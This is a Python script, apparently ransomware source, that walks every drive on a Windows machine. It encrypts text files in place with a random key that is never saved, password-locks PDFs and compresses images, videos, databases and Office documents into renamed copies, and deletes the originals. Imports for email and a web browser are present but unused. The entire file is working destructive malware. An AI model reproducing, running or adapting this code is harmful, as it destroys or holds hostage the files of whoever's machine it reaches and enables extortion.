from cryptography.fernet import Fernet
import os
import sys
import zlib
import glob
import time
import smtplib
import win32api
import webbrowser
import docx2txt
from PyPDF2 import PdfFileReader, PdfFileWriter

def encrypt():
  key = Fernet.generate_key().decode("ascii")
  cipher_suite = Fernet(key)
  drives = win32api.GetLogicalDriveStrings()
  drives = drives.split("\000")[:-1]
  l1 = [".jpg", ".jpeg", ".csv", ".png", ".db", ".doc", ".mpeg", "mpeg4", ".avi", ".docx"]
  for d in drives:
    for dirpath, dirs, files in os.walk(d):
      print("Encrypting... {}".format(dirpath))
      try:
        for filename in files:
          f = "{}\\{}".format(dirpath, filename)
          if os.path.splitext(str(f))[-1] == ".txt":
            with open(f, 'r') as txt:
              files_txt = txt.read()
              if not files_txt.startswith("gAAAAA"):
                cipher_text = cipher_suite.encrypt(bytes(files_txt.encode("utf-8"))).decode("ascii")
                with open(f, 'w') as txt_enc:
                  txt_enc.write(cipher_text)
          elif os.path.splitext(str(f))[-1] == ".pdf":
            pdf = PdfFileReader(open(f, "rb"), strict=True)
            if not pdf.isEncrypted:
              path_pdf, f_pdf = os.path.split(f)
              output_file = os.path.join(path_pdf, "enc_{}".format(filename))
              output = PdfFileWriter()
              input_stream = PdfFileReader(open(f, "rb"))
              for i in range(0, input_stream.getNumPages()):
                output.addPage(input_stream.getPage(i))
              output_stream = open(output_file, "wb")
              output.encrypt(user_pwd=key, owner_pwd="test", use_128bit=True)
              output.write(output_stream)
              input_stream.stream.close()
              output_stream.close()
              pdf.stream.close()
              os.remove(f)
            pdf.stream.close()
          elif os.path.splitext(str(f))[-1] in l1:
            with open(f, "rb") as others:
              c = zlib.compress(others.read(), 9)
            path_files, f_others = os.path.split(f)
            output_file2 = os.path.join(path_files, "enc_{}".format(filename))
            with open(output_file2, "wb") as o:
              o.write(c)
            others.close()
            o.close()
            os.remove(f)
          else:
            continue
      except Exception as e:
        print(e)
        time.sleep(10)
        continue

if __name__ == "__main__":
  encrypt()


